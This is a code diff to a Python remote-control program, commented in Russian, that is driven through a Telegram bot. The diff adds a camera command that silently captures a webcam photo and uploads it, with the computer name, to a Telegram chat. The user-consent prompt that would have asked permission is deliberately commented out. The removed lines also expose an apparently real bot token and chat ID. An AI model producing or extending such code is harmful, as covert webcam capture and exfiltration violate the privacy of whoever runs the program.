@@ -10,14 +10,28 @@ from datetime import datetime
 import threading
 import pystray
 from PIL import Image, ImageDraw
-
+import tkinter as tk
+from tkinter import messagebox
+import cv2
 
 # ==========================
 # Telegram
 # ==========================
 
-BOT_TOKEN = "8695199400:AAEViIMPjk2NzDD4xigw_Aht2bczdMxPqaY"
-CHAT_ID = "5182723934"
+try:
+    folder = os.path.dirname(os.path.abspath(__file__))
+    telegram_file = os.path.join(folder, "Telegram.txt")
+
+    with open(telegram_file, "r", encoding="utf-8") as f:
+        lines = [line.strip() for line in f.readlines()]
+
+    BOT_TOKEN = lines[0]
+    CHAT_ID = lines[1]
+
+except Exception as e:
+    print(f"Ошибка чтения Telegram.txt: {e}")
+    os._exit(1)
+
 
 
 # ==========================
@@ -74,7 +88,7 @@ def main_menu():
             {"text": "🔄 Обновить"}
         ],
         [
-            {"text": "🔒 Блокировать"}
+            {"text": "📷 Камера"}
         ]
     ]
 
@@ -156,6 +170,115 @@ def screenshot():
         telegram(
             f"❌ Ошибка скриншота:\n{e}"
         )
+
+# ==========================
+# Фото с камеры
+# ==========================
+
+def camera_photo():
+
+    #import tkinter as tk
+    #from tkinter import messagebox
+    import tempfile
+
+
+    #root = tk.Tk()
+    #root.withdraw()
+
+
+    #answer = messagebox.askyesno(
+        #"Камера",
+        #"Разрешить сделать снимок с веб-камеры?"
+    #)
+
+
+    #root.destroy()
+
+
+    #if not answer:
+
+        #telegram(
+            #"📷 Снимок отменён пользователем"
+        #)
+
+        #return
+
+
+
+    try:
+
+        cap = cv2.VideoCapture(0)
+
+
+        if not cap.isOpened():
+
+            telegram(
+                "❌ Камера не найдена"
+            )
+
+            return
+
+
+
+        ret, frame = cap.read()
+
+
+        cap.release()
+
+
+
+        if not ret:
+
+            telegram(
+                "❌ Не удалось получить изображение"
+            )
+
+            return
+
+
+
+        filename = os.path.join(
+            tempfile.gettempdir(),
+            "camera_photo.jpg"
+        )
+
+
+        cv2.imwrite(
+            filename,
+            frame
+        )
+
+
+
+        with open(
+            filename,
+            "rb"
+        ) as photo:
+
+
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                data={
+                    "chat_id": CHAT_ID,
+                    "caption":
+                    f"📷 Фото с камеры\n💻 {PC_NAME}\n🕒 {datetime.now()}"
+                },
+                files={
+                    "photo": photo
+                }
+            )
+
+
+        os.remove(filename)
+
+
+
+    except Exception as e:
+
+        telegram(
+            f"❌ Ошибка камеры:\n{e}"
+        )
+
 
 # ==========================
 # Команды
@@ -381,9 +504,9 @@ while True:
                 update_program()
 
 
-            elif text=="🔒 Блокировать":
+            elif text=="📷 Камера":
 
-                lock()
+                camera_photo()
 
 
 
